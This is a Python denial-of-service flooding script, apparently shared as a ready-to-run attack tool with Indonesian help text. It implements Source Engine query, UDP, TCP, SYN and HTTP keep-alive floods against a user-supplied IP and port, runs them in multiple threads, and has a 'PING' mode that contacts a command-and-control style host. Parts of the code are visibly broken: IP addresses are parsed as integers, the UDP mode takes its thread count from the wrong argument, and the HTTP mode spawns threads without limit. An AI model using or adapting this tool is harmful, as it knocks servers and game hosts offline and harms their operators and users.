import socket
import threading
import time
import random
import sys

print("""  ___   ___ ___ ___\n /  \\  /  //  //__\n/____|/__//__/___/ @KuliOnline0011\n""")

base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
]

def rand_ua():
    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())

def attack_vse(ip, port, secs):
    payload = b'\xff\xff\xff\xffTSource Engine Query\x00'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))

def attack_udp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(data, (ip, dport))

def attack_tcp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(random._urandom(size))
        except:
            pass

def attack_syn(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(0)
        try:
            dport = random.randint(1, 65535) if port == 0 else port
            s.connect((ip, dport)) # RST/ACK or SYN/ACK as response
        except:
            pass

def attack_http(ip, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, 5050))
            while time.time() < secs:
                s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            s.close()

def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    
    try:
        
        if len(sys.argv) < 2:
            print("Untuk bantuan python3 ddos.py -h")
            print("              python3 ddos.py --help")
            sys.exit()
            
        elif sys.argv[1] == '-h' or sys.argv[1] == '--help':
            print("VSE attack  = python3 ddos.py VSE [ip] [port] [secs] [threads]")
            print("UDP attack  = python3 ddos.py UDP [ip] [port] [secs] [size] [threads]")
            print("TCP attack  = python3 ddos.py TCP [ip] [port] [secs] [size] [threads]")
            print("SYN attack  = python3 ddos.py SYN [ip] [port] [secs] [threads]")
            print("HTTP attack = python3 ddos.py HTTP [ip] [secs] [threads]")
            print("PING attack = python3 ddos.py PING\n")
            sys.exit()
            
        elif sys.argv[1] == 'VSE':
            try:
                ip = int(sys.argv[2])
                port = int(sys.argv[3])
                secs = time.time() + int(sys.argv[4])
                threads = int(sys.argv[5])

                for _ in range(threads):
                    threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
            except KeyboardInterrupt:
                print("Tools dinonaktifkan ya")

        elif sys.argv[1] == 'UDP':
            try:
                ip = int(sys.argv[2])
                port = int(sys.argv[3])
                secs = time.time() + int(sys.argv[4])
                size = int(sys.argv[5])
                threads = int(sys.argv[1])

                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
            except KeyboardInterrupt:
                print("Tools dinonaktifkan ya")

        elif sys.argv[1] == 'TCP':
            try:
                ip = int(sys.argv[2])
                port = int(sys.argv[3])
                secs = time.time() + int(sys.argv[4])
                size = int(sys.argv[5])
                threads = int(sys.argv[6])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
            except KeyboardInterrupt:
                print("Tools dinonaktifkan ya")

        elif sys.argv[1] == 'SYN':
            try:
                ip = int(sys.argv[2])
                port = int(sys.argv[3])
                secs = time.time() + int(sys.argv[4])
                threads = int(sys.argv[5])

                for _ in range(threads):
                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
            except KeyboardInterrupt:
                print("Tools dinonaktifkan ya")

        elif sys.argv[1] == 'HTTP':
            try:
                ip = sys.argv[2]
                secs = time.time() + int(sys.argv[3])
                threads = int(sys.argv[4])

                for _ in range(threads):
                    a = 0
                    while 1:
                        threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
                        a += 1
                        print(f"Serangan HTTP Flood {a}")
            except KeyboardInterrupt:
                print("Tools dinonaktifkan ya")

        elif sys.argv[1] == 'PING':
            try:
                ip = int(sys.argv[2])
                port = int(sys.argv[3])
                c2.connect((ip, port))
                c2.send('PONG'.encode())
            except KeyboardInterrupt:
                print("Tools dinonaktifkan ya")
    except KeyboardInterrupt:
        c2.close()

    

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("Tools dinonaktifkan ya")